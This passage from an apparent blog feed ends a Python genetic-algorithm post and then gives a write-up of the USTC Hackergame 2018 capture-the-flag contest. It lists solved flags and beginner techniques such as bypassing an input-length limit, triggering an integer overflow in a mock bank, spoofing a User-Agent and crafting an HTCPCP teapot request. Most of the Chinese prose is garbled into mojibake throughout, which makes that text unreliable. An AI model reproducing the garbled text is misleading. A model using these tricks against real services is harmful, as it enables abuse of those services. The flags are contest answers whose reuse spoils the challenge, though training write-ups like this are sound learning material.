class="token punctuation">(</span>population<span class="token punctuation">,</span>Dpopulation<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#print(DNAdict)</span>        new_population <span class="token operator">=</span> selection<span class="token punctuation">(</span>population<span class="token punctuation">,</span>y<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#crossover ‰∫§Âèâ</span>        offspring <span class="token operator">=</span>crossover<span class="token punctuation">(</span>new_population<span class="token punctuation">,</span><span class="token number">0.8</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#mutation ÂèòÂºÇ</span>        population<span class="token operator">=</span>mutation<span class="token punctuation">(</span>offspring<span class="token punctuation">,</span><span class="token number">0.001</span><span class="token punctuation">)</span>        population<span class="token punctuation">,</span>Dpopulation <span class="token operator">=</span> Decode<span class="token punctuation">(</span>population<span class="token punctuation">)</span>        y<span class="token punctuation">,</span>population <span class="token operator">=</span> gafunction<span class="token punctuation">(</span>population<span class="token punctuation">,</span>Dpopulation<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#ÈÄöËøáÂπ≥ÂùáÂÄºË°®Á§∫Ëø≠‰ª£ËøõÂåñ</span>        meannum <span class="token operator">=</span> np<span class="token punctuation">.</span>mean<span class="token punctuation">(</span>y<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#ÈÄöËøáÊúÄÂ∞èÂÄºË°®Á§∫Ëø≠‰ª£ËøõÂåñ</span>        minnum <span class="token operator">=</span> min<span class="token punctuation">(</span>y<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#ÈÄöËøáÊúÄÂ§ßÂÄºË°®Á§∫Ëø≠‰ª£ËøõÂåñ</span>        maxnum <span class="token operator">=</span> max<span class="token punctuation">(</span>y<span class="token punctuation">)</span>        X<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>        Y<span class="token punctuation">.</span>append<span class="token punctuation">(</span>minnum<span class="token punctuation">)</span>        Y1<span class="token punctuation">.</span>append<span class="token punctuation">(</span>meannum<span class="token punctuation">)</span>        Y2<span class="token punctuation">.</span>append<span class="token punctuation">(</span>maxnum<span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>X<span class="token punctuation">,</span>Y<span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">'b'</span><span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>X<span class="token punctuation">,</span>Y2<span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">'g'</span><span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>X<span class="token punctuation">,</span>Y1<span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">'y'</span><span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>axhline<span class="token punctuation">(</span>FuncMax<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> linewidth<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> color<span class="token operator">=</span><span class="token string">'r'</span><span class="token punctuation">)</span>      plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>    </code></pre><blockquote><p>ÂèÇËÄÉÔºö</p><p><a href="https://www.cnblogs.com/ECJTUACM-873284962/p/8857950.html" target="_blank" rel="noopener">https://www.cnblogs.com/ECJTUACM-873284962/p/8857950.html</a></p><p><a href="https://blog.csdn.net/WFRainn/article/details/80458246" target="_blank" rel="noopener">https://blog.csdn.net/WFRainn/article/details/80458246</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ÁÆóÊ≥ï </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> ÁÆóÊ≥ï </tag>
            
            <tag> Êï∞Â≠¶Âª∫Ê®° </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ustc-Hackergam2018</title>
      <link href="/2018/10/16/ustc-Hackergam2018/"/>
      <url>/2018/10/16/ustc-Hackergam2018/</url>
      
        <content type="html"><![CDATA[<p>‚Ä¶‚Ä¶</p><a id="more"></a><h1 id="‰∏≠ÁßëÂ§ß-Hackergame2018-write-up"><a href="#‰∏≠ÁßëÂ§ß-Hackergame2018-write-up" class="headerlink" title="‰∏≠ÁßëÂ§ß-Hackergame2018 write-up"></a>‰∏≠ÁßëÂ§ß-Hackergame2018 write-up</h1><blockquote><pre><code>Ëøô‰∏™ÊØîËµõ‰∏ªË¶ÅÈù¢ÂêëÊñ∞ÁîüÔºåËæÉ‰∏∫ÂèãÂ•ΩÔºåÈìæÊé•Ôºöhttps://hack.lug.ustc.edu.cn/ÂÆòÊñπwriteup:&lt;https://github.com/ustclug/hackergame2018-writeups&gt;Ê≠§Âú∫ÊØîËµõÂÖÖÊª°‰∫ÜÁå´Âí™‰∏éflxgÔºàÂ∫üÁêÜÂÖ¥Â∑•ÔºâÔºåËôΩÁÑ∂‰Ωú‰∏∫‰∏Ä‰∏™ËÄÅËÖäËÇâÂéªÂÅöÂ∞èÈ≤úËÇâÁöÑÈ¢òÂæà‰∏çÂ•ΩÊÑèÊÄùÔºå‰ΩÜËØ•ÂÅöÁöÑËøòÊòØË¶ÅÂÅöÂï¶„ÄÇ</code></pre></blockquote><h2 id="Á≠æÂà∞È¢ò"><a href="#Á≠æÂà∞È¢ò" class="headerlink" title="Á≠æÂà∞È¢ò"></a>Á≠æÂà∞È¢ò</h2><blockquote><p>ÊâìÂºÄ<a href="http://202.38.95.46:12002/" target="_blank" rel="noopener">È¢òÁõÆÈìæÊé•</a>‰πãÂêéÔºåÈ¢òÈù¢Â¶Ç‰∏ãÂõæÔºö</p></blockquote><p>  <img src="https://i.loli.net/2018/10/12/5bc02b2fdc456.png" alt=""></p><blockquote><pre><code>KeyÁöÑËæìÂÖ•Ê°ÜÈôêÂà∂‰∫ÜÈïøÂ∫¶ÔºåÈÄöËøáÂºÄÂèëËÄÖÂ∑•ÂÖ∑‰øÆÊîπÈ°µÈù¢Ê∫êÁ†ÅÔºåÊàñËÄÖÊäìÂåÖÂèëÈÄÅ hackergame2018Ëé∑Âèñ flag:The flag is: flag{Hackergame2018_Have_Fun!}</code></pre></blockquote><p>  <img src="https://i.loli.net/2018/10/12/5bc02bfb8a96d.png" alt="">  </p><h2 id="Áå´Âí™ÈóÆÁ≠î"><a href="#Áå´Âí™ÈóÆÁ≠î" class="headerlink" title="Áå´Âí™ÈóÆÁ≠î"></a>Áå´Âí™ÈóÆÁ≠î</h2><blockquote><p>Ëøô‰∏ÄÈ¢òËôΩÁÑ∂Ë°®Èù¢‰∏äÊòØÂØπ‰∏≠ÁßëÂ§ßÊñ∞ÁîüÊúâ‰ºòÂäøÔºå‰ΩÜÊòØÂÆûÈôÖ‰∏äÊòØ‰∏™Á§æÂ∑•È¢ò„ÄÇËÄÉÈ™åÂ≠¶ÁîüÁöÑÊêúÁ¥¢ËÉΩÂäõÔºå‰ø°ÊÅØÊî∂ÈõÜËÉΩÂäõ„ÄÇÊØïÁ´ü‰ø°ÂÆâËÇØÂÆöÊòØË¶ÅË∑üËøô‰∏™Êâì‰∫§ÈÅìÁöÑÂï¶„ÄÇÁÆÄÂçïÊêúÁ¥¢ÔºàÁôæÂ∫¶ÔºåÂøÖÂ∫îÔºåË∞∑Ê≠åÔºâ‰∏Ä‰∏ãÔºåÊèê‰∫§ÂæóÂà∞flagÔºö</p><p>flag{G00G1E-is-always-YOUR-FRIEND} </p></blockquote><p>  <img src="https://i.loli.net/2018/10/12/5bc02da7e38a4.png" alt=""></p><h2 id="Ê∏∏Âõ≠‰ºöÁöÑÈõÜÁ´†Âç°Áâá"><a href="#Ê∏∏Âõ≠‰ºöÁöÑÈõÜÁ´†Âç°Áâá" class="headerlink" title="Ê∏∏Âõ≠‰ºöÁöÑÈõÜÁ´†Âç°Áâá"></a>Ê∏∏Âõ≠‰ºöÁöÑÈõÜÁ´†Âç°Áâá</h2><blockquote><pre><code>Ëøô‰∏ÄÈ¢òÂÆûÈôÖ‰∏äËÄÉÈ™åÂ≠¶ÁîüÁöÑÊãºÂõæËÉΩÂäõÔºåÂè™‰∏çËøáÊòØËä±ÁöÑÂÆûÊó∂Èó¥ÈïøÁü≠ËÄåÂ∑≤ÔºåÈúÄË¶ÅÊ≥®ÊÑèÁöÑÂ∞±ÊòØÂ≠óÊØçÂíåÊï∞Â≠óÁöÑÂàÜËæ®ÔºåÂèØËÉΩÊúâÁöÑÂÖ∂‰ªñÈ¢òÁõÆ‰ºöÈúÄË¶Å‰∏Ä‰∏™ÂâçÈù¢ÁöÑËøáÁ®ãÊù•Ëé∑ÂèñÂà∞Èõ∂Á¢éÁöÑÂõæÁâáÔºåÂÜçÂà∞Ëøô‰∏ÄÊ≠•ÊãºÂõæ„ÄÇÊãºÂÆåÂõæÂèØ‰ª•ÂæóÂà∞flagÔºö    flag{H4PPY_1M4GE_PR0CE551NG}</code></pre></blockquote><p>  <img src="https://i.loli.net/2018/10/12/5bc02e508ccdd.png" alt=""></p><h2 id="Áå´Âí™ÂíåÈîÆÁõò"><a href="#Áå´Âí™ÂíåÈîÆÁõò" class="headerlink" title="Áå´Âí™ÂíåÈîÆÁõò"></a>Áå´Âí™ÂíåÈîÆÁõò</h2><blockquote><pre><code>È¢òÁõÆÊòØ‰∏Ä‰ªΩÁªèËøá‰∫Ü‰π±Â∫èÂ§ÑÁêÜÁöÑ‰ª£Á†ÅÔºåËôΩÁÑ∂ËØ¥ÊòØ‰π±Â∫èÔºå‰ΩÜËøòÊòØÊúâ‰∏ÄÂÆöËßÑÂæãÁöÑÔºåÊØîÂ¶ÇËØ¥ÂèØ‰ª•ÁúãÂá∫Ë∑üÂàóÊúâÂÖ≥Á≥ªÔºåÊüêÂàóÊï¥‰ΩìÁßªÂà∞Âè¶‰∏Ä‰∏™‰ΩçÁΩÆ‰πãÁ±ªÁöÑ„ÄÇ</code></pre><p>ÁÆÄÂçïÊù•ËØ¥ÔºåË¶ÅËøòÂéüÊï¥‰∏™È°πÁõÆÊòØ‰∏çÂ§™ÂèØËÉΩÂÆûÁé∞ÁöÑÔºåÊâÄ‰ª•Êàë‰ª¨ÈúÄË¶ÅÊ†πÊçÆÂá∫È¢ò‰∫∫ÁªôÊàë‰ª¨ÁöÑË∑ØÔºåËÆ§ÁúüÊäâÊã©ÔºåÁÑ∂ÂêéË°åÂä®„ÄÇÊØîÂ¶ÇÊ∫êÁ†ÅÈ¶ñÈÉ®ÁöÑauthorÔºånameÔºåurlÁ≠â‰ø°ÊÅØÔºåÂèØ‰ª•Ë∞∑Ê≠åÂæóÂà∞È°πÁõÆÁöÑ‰∏ÄÈÉ®ÂàÜÊ∫êÁ†ÅÔºåÂÜçËøòÂéü‰∏ÄÈÉ®ÂàÜÂÖ≥ÈîÆÊÄßÁöÑ‰ª£Á†ÅÔºåÁêÜËß£ÈÄªËæëÂç≥ÂèØ„ÄÇ</p></blockquote><p>  <img src="https://i.loli.net/2018/10/12/5bc0378f2d30c.png" alt=""></p><p>  <img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/12/5bc0317a3d624.png" class="lazyload"></p><blockquote><pre><code>Ê†πÊçÆnameÔºåauthorÂèØ‰ª•Âú®ÊêúÂà∞‰Ωç‰∫égithubÁöÑÈ°πÁõÆÊ∫êÁ†ÅÔºåÂâç‰∏ÄÈÉ®ÂàÜËá™ÂÆö‰πâÂáΩÊï∞ÊòØÁõ∏ÂêåÁöÑÔºå‰∏ªÂáΩÊï∞‰∏çÂêåÔºåÊàë‰ª¨ËøòÂéü‰∏Ä‰∏ãABCÔºåBACÔºåCABÔºöABCÔºöFfQ47if9Zxw9jXE68VtGABACÔºöJDk6Y6Xc88UrUtpK3iF8pCABÔºö7BMs4y2gzdG8Ao2gv6aiJÊ†πÊçÆ‰∏ªÂáΩÊï∞ÈÄªËæëÂèØ‰ª•ÂæóÂà∞flagÊòØÂÉè‰∏ãÈù¢ËøôÊ†∑ÊãºÊé•ÁöÑÔºöprintf(&quot;%s%s%s%s %s%s%s%s%s%s%d %s%d%s&quot;Ôºå&quot;f&quot;,&quot;l&quot;,&quot;a&quot;,&quot;g&quot;,ABC,&quot;&quot;,BAC,&quot;&quot;,CAB,&quot;}&quot;,&quot;type_printf&quot;,&quot;_&quot;,&quot;}&quot;)flag{FfQ47if9Zxw9jXE68VtGAJDk6Y6Xc88UrUtpK3iF8p7BMs4y2gzdG8Ao2gv6aiJ125type_printf92}</code></pre></blockquote><h2 id="Word-ÊñáÊ°£"><a href="#Word-ÊñáÊ°£" class="headerlink" title="Word ÊñáÊ°£"></a>Word ÊñáÊ°£</h2><blockquote><pre><code>ËøôÈ¢òÁöÑËØù‰∏ªË¶ÅÊòØÁªôÊñ∞ÁîüÊâ©ÂÖÖ‰∏Ä‰∏™Áü•ËØÜÁÇπÔºöofficeÂ•ó‰ª∂ÂÆûÈôÖ‰∏äÈÉΩÂ±û‰∫ézipÂéãÁº©ÂåÖÔºåÂ∞ÜÂêéÁºÄÊîπ‰∏∫zipÂ∞±ËÉΩ‰ª•ÂéãÁº©ÂåÖÁöÑÂΩ¢ÂºèÊâìÂºÄofficeÊñáÊ°£ÔºåÁÑ∂ÂêéÁúãËßÅÂÖ∂Êñá‰ª∂ÁªìÊûÑ„ÄÇ</code></pre></blockquote><p>  <img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/12/5bc03a0493152.png" class="lazyload"></p><h2 id="Áå´Âí™Èì∂Ë°å"><a href="#Áå´Âí™Èì∂Ë°å" class="headerlink" title="Áå´Âí™Èì∂Ë°å"></a>Áå´Âí™Èì∂Ë°å</h2><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/12/5bc03afaf3184.png" class="lazyload"></p><blockquote><pre><code>ÂèàÊòØ‰∏ÄÈÄöËøáÈùûÊ≥ïËé∑ÂèñÈí±Ë¥¢‰π∞flagÁöÑÈ¢òÁõÆÂë¢ÔºåÁªèËøáÁÆÄÂçïÁöÑÂ∞ùËØïËæìÂÖ•ÂêéÂèëÁé∞Ê≤°‰ªÄ‰πàÁâπÊÆäÁöÑÊºèÊ¥ûÔºå‰∏çËÉΩ‰ª•ÁßëÂ≠¶ËÆ°Êï∞ÔºàÂ¶Ç 0e516516ÔºâÁöÑÊñπÂºè‰Ωú‰∏∫ÂàáÂÖ•ÁÇπÔºåÊîπcookieÂè™ËÉΩÈáçÁΩÆË¥¶Êà∑Ôºå‰π∞1/4‰∏™flagË∑üÊ≤°‰π∞‰ººÁöÑ„ÄÇ</code></pre><p>‚Äã    ‰ªîÁªÜÁúãÂèØ‰ª•ÂèëÁé∞ÔºåÁêÜË¥¢Êó∂Èó¥Êúâ‰∏ãÈôêÔºå‰ΩÜÊòØÊ≤°Êúâ‰∏äÈôêÔºåÂÖàÂÖëÊç¢TDSUÔºåËæì‰∏Ä‰∏™Â§ßÊï∞ËØïËØïÁúãÔºåoh‰∏Ä‰∏çÂ∞èÂøÉÂ∞±Ê∫¢Âá∫‰∫ÜÔºö</p></blockquote><p>  <img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/12/5bc03c707e924.png" class="lazyload"></p><blockquote><pre><code>‰ΩÜÊòØÊàë‰ª¨ÈúÄË¶ÅÊéßÂà∂Ê∫¢Âá∫ÁöÑÊî∂ÁõäÔºå‰∏çÁÑ∂Êî∂Áõä‰∏∫Ë¥üÔºåÂ§ü‰Ω†ÂèóÁöÑ‰∫Ü„ÄÇÈÄöËøáÊéßÂà∂ËæìÂÖ•ÁöÑÂ§ßÊï∞ÁöÑÂ§ßÂ∞èÊù•Ë∞ÉËäÇÔºö922337203685477500</code></pre></blockquote><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/12/5bc03da7f11cd.png" class="lazyload"></p><blockquote><p>The flag is: <code>flag{Evil_Integer._Evil_Overflow.}</code> </p><p>Êä§ÁΩëÊùØ‰∏≠ÈÇ£‰∏™Ëæ£Êù°‰πãÁéãÊ∫¢Âá∫ÁöÑÈ¢òÊØîËæÉÁ≤æÂ¶ôÔºåÈúÄË¶ÅÈÄöËøáÊù°‰ª∂Á´û‰∫âÁöÑÊâãÊ≥ïÔºàÂç≥Â§öÁ∫øÁ®ãÂêåÊó∂Ë¥≠‰π∞ÔºåÂêå‰∏ÄÊó∂Èó¥Â§öÊ¨°Ë¥≠‰π∞Âè™ÈúÄË¶Å‰∏ÄÊ¨°‰ªòÈí±ÔºâÔºåÂÜçÂà§Êñ≠Ê∫¢Âá∫ÁÇπÔºå‰ªéËÄågetflagÔºöÈ¢òËß£ <a href="https://qingchenldl.github.io/2018/10/13/%E6%8A%A4%E7%BD%91%E6%9D%AFWP-BitPwn/?tdsourcetag=s_pcqq_aiomsg" target="_blank" rel="noopener">https://qingchenldl.github.io/2018/10/13/%E6%8A%A4%E7%BD%91%E6%9D%AFWP-BitPwn/?tdsourcetag=s_pcqq_aiomsg</a></p></blockquote><h2 id="ÈªëÊõúÁü≥ÊµèËßàÂô®"><a href="#ÈªëÊõúÁü≥ÊµèËßàÂô®" class="headerlink" title="ÈªëÊõúÁü≥ÊµèËßàÂô®"></a>ÈªëÊõúÁü≥ÊµèËßàÂô®</h2><blockquote><p>ËøôÂ∞±ÊòØÈÇ£‰∏™ÂùëÂà∞Êó†Êï∞ËÄÅÂ∞ëÁà∑‰ª¨Ôºå‰∏ÄÊó∂È£éÂ§¥Êó†‰ø©ÁöÑÈªëÊõúÁü≥ÊµèËßàÂô®(HeiCore)ÔºåÁ°ÆÂÆûÂá∫È¢ò‰∫∫ÊØîËæÉËâØÂøÉÔºå‰∏∫Ëøô‰∏™È¢òÁõÆÁîöËá≥‰∏ìÈó®ÂÜô‰∫Ü‰∏Ä‰∏™ÂâçÁ´ØÈ°µÈù¢Êù•Ëø∑ÊÉëÂêÑ‰ΩçCTFerÔºåËøô‰∏™ÈªëÊõúÁü≥ÊµèËßàÂô®‰∏ªÈ°µÊòØÂú®ÁôæÂ∫¶‰∏ä‰∏çËÉΩÊêúÁ¥¢Âà∞ÁöÑÔºåÂú®ÂøÖÂ∫îÂíåË∞∑Ê≠å‰∏äÂèØ‰ª•Êü•Âà∞ÔºåÂæàÊòéÊòæËøô‰∏™È°µÈù¢Âæà‰∏çÊ≠£ÁªèÔºåÁÆÄÁõ¥ÊòØÂú®Âò≤Á¨ëÂêÑ‰ΩçCTFerÁöÑÊô∫ÂïÜÂòõÊòØ‰∏çÊòØÔºü</p><p>Â•ΩÂõûÂà∞È¢òÁõÆÔºåÂÆûÈôÖ‰∏äÊàë‰ª¨‰πüÂÅö‰∫ÜÊØîËæÉ‰πÖÔºåÂ∞ùËØïËøáÂêÑÁßçÊñπÊ≥ï‰πãÂêéÂõûÂà∞‰∫ÜÂéüÁÇπÔºöÈªëÊõúÁü≥ÊµèËßàÂô®‰∏ªÈ°µÔºåËøô‰∏™‰∏ªÈ°µÈô§‰∫ÜÂÅáÊ≠£Áªè‰πãÂ§ñËøòÊúâÂ∞±ÊòØÔºå‰∏çËÉΩÊü•ÁúãÊ∫êÁ†ÅÔºåÁî®Ë∞∑Ê≠åÁöÑÂºÄÂèëËÄÖÂ∑•ÂÖ∑Áúã‰∏ªÈ°µÊó∂‰ºöËøîÂõû404„ÄÇÈÇ£‰πàÈóÆÈ¢òÂ∑≤ÁªèÊØîËæÉÊòéÊòæ‰∫ÜÔºåËøôÈáåÂ∞±ÊòØÂá∫È¢ò‰∫∫ÁöÑÈòªÁ¢çÔºå‰∏∫Âï•Ë¶ÅÈòªÁ¢çÔºåÂõ†‰∏∫ÂÖ≥ÈîÆÂú®ËøôÈáåÔºåÊãøÂà∞ÂÖ≥ÈîÆÁöÑ‰∏úË•ø‰πãÂêéÊàë‰ª¨Â∞±ÂèØ‰ª•ÂéªÈ¢òÁõÆÈÇ£ÈáåËé∑Âèñflag‰∫Ü„ÄÇ</p><p>Ë∞∑Ê≠åÁî®‰∏ç‰∫ÜÊàë‰ª¨Áî®ÁÅ´ÁãêÂòõÔºåÊù•ÁúãÁúãnetworkÔºåÁúãÁúãÊ∫êÁ†ÅÔºö</p></blockquote><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/12/5bc0424f6bfaf.png" class="lazyload"></p><blockquote><pre><code>Âì¶ÂöØÔºåËé∑Âæó‰∫Ü‰∏Ä‰∏™user-agentÔºåÈ¢òÁõÆÈ°µÈù¢‰∏çÊòØÈúÄË¶ÅÈÄöËøáÈªëÊõúÁü≥ÊµèËßàÂô®ËÆøÈóÆÂêóÔºåÊó¢ÁÑ∂Êàë‰ª¨Ê≤°ÊúâÈªëÊõúÁü≥ÊµèËßàÂô®Ëøô‰∏™‰∏úË•øÔºåÂΩìÁÑ∂‰πüÂèØ‰ª•ÈÄöËøáuser-agentÊù•‰ª£Ë°®Êàë‰ª¨ÊòØÈªëÊõúÁü≥ÊµèËßàÂô®ÁöÑË∫´‰ªΩÂíØÔºåÊûÑÈÄ†ËØ∑Ê±ÇÔºåÂä†‰∏äuser-agnetÔºågetflag„ÄÇ</code></pre><p>The flag is: <code>flag{H3ic0re_49.1.2623.213_sai_kou}</code> </p></blockquote><h2 id="ÂõûÂà∞ËøáÂéª"><a href="#ÂõûÂà∞ËøáÂéª" class="headerlink" title="ÂõûÂà∞ËøáÂéª"></a>ÂõûÂà∞ËøáÂéª</h2><pre class=" language-shell"><code class="language-shell">#input_sequenceqedaflag{.a44a2b8a3d9b2c               #ÂÖ≥ÈîÆÂú®Ëøô‰∏ÄË°åÊúÄÂêéÁöÑcÊòØ‰øùÁïô‰∏ç‰øùÁïôc44039f93345}.2m3                    #ÂºÄÂßãÊç¢Ë°å2m52m12                    #ÂàáÊç¢Âà∞Á¨¨‰∫åË°ås/4/t                #Â∞ÜÂΩìÂâçË°åÁöÑÁ¨¨‰∏Ä‰∏™4ÊõøÊç¢‰∏∫tqq</code></pre><blockquote><pre><code>Ëøô‰∏ÄÈ¢ò‰ªãÁªç‰∫Ü‰∏Ä‰∏ãedÁºñËæëÂô®ÁöÑ‰ΩøÁî®ÔºåÁªôÂá∫‰∫Ü‰∏Ä‰∏™Êñá‰ª∂Â¶Ç‰∏äÔºåÈáåÈù¢ÊúâÈîÆÁõòËÆ∞ÂΩïÔºåÂÆûÈôÖ‰∏äÊ†πÊçÆÈîÆÁõòËÆ∞ÂΩïÔºåÂà©Áî®edÁºñËæëÂô®ÈáçÂÜô‰∏ÄÈÅçÂ∞±ÂèØËé∑ÂæóflagÔºå‰ΩÜÊòØËøô‰∏™ËøòÊòØÊúâ‰∏Ä‰∏™ÂùëÁÇπÔºåÈÇ£Â∞±ÊòØÈÇ£‰∏™Â§öÂá∫Êù•ÁöÑ ESCÁâπÊÆäÁ¨¶ÔºåÂàöÂºÄÂßãÂú®MobaXterm‰∏äÈù¢Ëá™Â∏¶ÁöÑedÂÅöÈ¢òÔºåÂèëÁé∞ 2m3‰πãÁ±ªÁöÑÊç¢Ë°åÂëΩ‰ª§Êó†Ê≥ïÂÆûÁé∞ÔºåÂêéÊù•‰ΩøÁî®‰∫ëÊúçÂä°Âô®ËøõË°å‰∏ÄÊ≥¢Êìç‰ΩúÂæóÂà∞flagÔºö</code></pre><p>flag{t4a2b8c44039f93345a3d9b2}</p></blockquote><h2 id="ÊàëÊòØË∞Å"><a href="#ÊàëÊòØË∞Å" class="headerlink" title="ÊàëÊòØË∞Å"></a>ÊàëÊòØË∞Å</h2><blockquote><pre><code>Ëøô‰∏ÄÈ¢òÊúâ‰∏§‰∏™Â∞èÈ¢òÔºåÂÖÖÊª°Âì≤Â≠¶„ÄÇËÄÉÂØüÁöÑÊòØÂÆ¢Êà∑Á´ØÈîôËØØÁõ∏Â∫î‰ª£Á†ÅÂíå ‚ÄúÈÄíËå∂‚ÄùÂçèËÆÆ„ÄÇ„ÄÇ„ÄÇ</code></pre><p>Á¨¨‰∏ÄÈ¢òÈÄöËøáÊü•ÁúãnetworkÔºåÂèØ‰ª•ÁúãÂà∞status codeÈáåÈù¢Êúâ <code>418 I AM A TEAPOT</code>ÔºåÊ≠£Â•ΩÈóÆÊàëÊòØË∞ÅÂòõÔºåÊääTEAPOTÂ°´ËøõÂéªÔºågetflag1:<br>flag{i_canN0t_BReW_c0ffEE!} </p></blockquote><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/12/5bc0460ef19b2.png" class="lazyload"></p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/12/5bc0464a1b3a2.png" class="lazyload"></p><blockquote><pre><code>ÁÑ∂ÂêéÂèØ‰ª•Ëé∑ÂèñÁ¨¨‰∫åÂ∞èÈ¢òÁöÑÈìæÊé•ÔºåÁÆÄÂçïÊü•Áúã‰∏Ä‰∏ãÔºåÂìçÂ∫îÂ¶Ç‰∏ãÔºö</code></pre></blockquote><pre class=" language-shell"><code class="language-shell">#ËøôÂπ¥Â§¥ÁªôÂ§ß‰Ω¨ÈÄíËå∂ÈÉΩ‰∏çÁÆÄÂçï‰∫ÜBrewing tea is not so easy.Try using other methods to request this page.#ËØïËØïpostËØ∑Ê±ÇÔºåÂìçÂ∫îÂ¶Ç‰∏ãÔºöThe method "POST" is deprecated.See RFC-7168 for more information.#ËØïËØïbrewËØ∑Ê±ÇÔºåÂìçÂ∫îÂ¶Ç‰∏ãÔºöPlease check if there is anything missing in your header.</code></pre><blockquote><p>ÁªìÂêà‰∏§È¢òÁöÑ‰ø°ÊÅØ I AM A TEAPOT  + brew tea + RFC-7168ÊêúÁ¥¢‰∏Ä‰∏ãÔºåÂèØ‰ª•ÂæóÂà∞ËØ¥ÊòéÊñáÊ°£Ôºö</p><pre><code>https://tools.ietf.org/html/rfc7168</code></pre><p>Ê†πÊçÆÊñáÊ°£ÊûÑÈÄ†ËØ∑Ê±ÇheaderÈáåÈù¢ÁöÑContent-Type: message/teapotÔºåÂèëÈÄÅËøáÂéªÂæóÂà∞Â¶Ç‰∏ã‰ø°ÊÅØ:</p></blockquote><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/12/5bc04932d86c3.png" class="lazyload"></p><blockquote><p>Ê†πÊçÆËøîÂõûÁöÑ‰ø°ÊÅØÔºåÊàë‰ª¨ÈúÄË¶ÅÂ∞ÜÊûÑÈÄ†ÁöÑËØ∑Ê±ÇÂèëÈÄÅÂà∞Âè¶‰∏Ä‰∏™url,Âç≥Âú®ÂéüurlÂêéÈù¢Âä†‰∏äÈÄíËå∂Á±ªÂûãblack_tea:</p><p>/the_super_great_hidden_url_for_brewing_tea/black_tea</p><p>getflag:</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/12/5bc049bab0ba3.png" class="lazyload"></p></blockquote><h2 id="ÂÆ∂ÈáåÊúâÁüø"><a href="#ÂÆ∂ÈáåÊúâÁüø" class="headerlink" title="ÂÆ∂ÈáåÊúâÁüø"></a>ÂÆ∂ÈáåÊúâÁüø</h2><blockquote><p>ÊèêÁ§∫Ôºö</p><ol><li>Êú¨È¢òÁöÑÊµèËßàÂô®‚ÄúÊåñÁüø‚ÄùÂè™‰∏∫ÊºîÁ§∫ÊÄßÁõÆÁöÑÔºåÂá†‰πé‰∏çÂç†ËµÑÊ∫ê„ÄÇÊàë‰ª¨‰∏ç‰ºö‰ª•‰ªª‰ΩïÂΩ¢ÂºèÁõóÂèñÊàñÊµ™Ë¥πÂ§ßÂÆ∂ÁîµËÑëÁöÑÁÆóÂäõ„ÄÇ</li><li>Êú¨È¢òÂ¶ÇÊûú‰ΩøÁî®Á®ãÂ∫èÊ±ÇËß£ÔºåÂØπ‰∫éÊôÆÈÄöÈÖçÁΩÆÁöÑ‰∏™‰∫∫ÁîµËÑëÔºåÂú®Ëß£Ê≥ïÊ≠£Á°Æ‰∏îÊúÄ‰ºòÁöÑÊÉÖÂÜµ‰∏ãÔºåÊ±ÇËß£Á®ãÂ∫èÁöÑÊúüÊúõËøêË°åÊó∂Èó¥‰∏ç‰ºöË∂ÖËøáÂá†ÂàÜÈíü„ÄÇ</li></ol><p>ËØ•È¢òÂπ∂‰∏çÊòØÂ∏∏ËßÑÁöÑweb È¢òÔºåËß£È¢òËøáÁ®ã‰∏çÊ∂âÂèäÊ≥®ÂÖ•„ÄÅXSS„ÄÅÊïèÊÑüÊñá‰ª∂Ê≥ÑÈú≤„ÄÅÂº±Á±ªÂûãÁ≠âÂÆâÂÖ®ÈóÆÈ¢ò„ÄÇ </p><p>‰ΩÜÊòØÊàëÊöÇÊó∂‰∏ç‰ºöÔºåÊâÄ‰ª•ÂæÖÊõ¥Êñ∞„ÄÇ</p></blockquote><h2 id="ÁßòÁ±çÊÆãÁØá"><a href="#ÁßòÁ±çÊÆãÁØá" class="headerlink" 